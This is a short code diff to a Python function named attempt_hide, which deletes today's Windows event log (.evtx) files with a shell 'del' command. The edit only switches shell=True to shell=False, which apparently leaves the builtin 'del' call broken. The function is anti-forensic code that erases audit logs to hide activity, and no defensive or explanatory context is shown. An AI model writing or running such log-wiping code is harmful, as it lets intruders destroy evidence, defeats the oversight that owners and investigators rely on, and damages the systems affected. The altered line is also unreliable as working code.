@@ -18,4 +18,4 @@ def attempt_hide():
 
     for file in os.listdir(log_path):
         if file.endswith(".evtx") and file.startswith(today.strftime("%Y-%m-%d")):
-            subprocess.run(f'del "{os.path.join(log_path, file)}"', shell=True)
+            subprocess.run(f'del "{os.path.join(log_path, file)}"', shell=False)
